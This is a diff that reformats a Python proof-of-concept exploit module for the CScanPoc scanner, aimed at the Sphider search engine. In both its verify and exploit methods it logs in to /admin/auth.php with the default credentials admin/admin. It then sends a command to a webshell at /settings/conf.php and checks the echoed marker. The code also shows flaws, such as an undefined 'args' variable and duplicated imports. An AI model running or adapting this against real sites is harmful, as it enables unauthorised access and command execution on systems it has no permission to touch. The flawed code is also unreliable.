@@ -2,8 +2,12 @@
 
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
-import urllib.request, urllib.parse, urllib.error
-import urllib.request, urllib.error, urllib.parse
+import urllib.request
+import urllib.parse
+import urllib.error
+import urllib.request
+import urllib.error
+import urllib.parse
 import re
 import http.client
 
@@ -43,13 +47,15 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            login_data = urllib.parse.urlencode({"user": "admin", "pass": "admin"})
+            login_data = urllib.parse.urlencode(
+                {"user": "admin", "pass": "admin"})
             login_url = '{target}'.format(target=self.target)+'/admin/auth.php'
             request = urllib.request.Request(login_url, login_data)
             request.add_header(
@@ -67,7 +73,8 @@ class Poc(ABPoc):
             response = urllib.request.urlopen(request)
             content = response.read()
             shell_url = args['options']['target'] + '/settings/conf.php'
-            request = urllib.request.Request(shell_url, "cmd=echo sphiderwebshell")
+            request = urllib.request.Request(
+                shell_url, "cmd=echo sphiderwebshell")
             response = urllib.request.urlopen(request)
             res = response.read()
             if "sphiderwebshell" in res:
@@ -78,12 +85,14 @@ class Poc(ABPoc):
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                 target=self.target, vuln=self.vuln))
 
-            login_data = urllib.parse.urlencode({"user": "admin", "pass": "admin"})
+            login_data = urllib.parse.urlencode(
+                {"user": "admin", "pass": "admin"})
             login_url = '{target}'.format(target=self.target)+'/admin/auth.php'
             request = urllib.request.Request(login_url, login_data)
             request.add_header(
@@ -101,7 +110,8 @@ class Poc(ABPoc):
             response = urllib.request.urlopen(request)
             content = response.read()
             shell_url = args['options']['target'] + '/settings/conf.php'
-            request = urllib.request.Request(shell_url, "cmd=echo sphiderwebshell")
+            request = urllib.request.Request(
+                shell_url, "cmd=echo sphiderwebshell")
             response = urllib.request.urlopen(request)
             res = response.read()
             if "sphiderwebshell" in res:
